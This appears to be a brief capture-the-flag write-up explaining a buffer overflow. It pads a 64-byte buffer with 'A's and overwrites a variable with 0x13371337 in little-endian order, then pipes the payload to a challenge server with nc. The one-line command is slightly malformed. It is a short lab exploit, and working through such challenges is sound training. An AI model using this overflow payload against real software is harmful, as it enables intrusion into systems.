Looking at the source, we can see that there is a buffer with a lenght of 64, so we need to overflow that.
We also need to turn bad into 0x13371337, and we can do this by adding it to the end of our 64 string overflow.
The payload is

    python -c "print 'A'*64 + '\x37\x13\x37\x13' | nc 104.236.80.67 5681 "
                                   (endian)
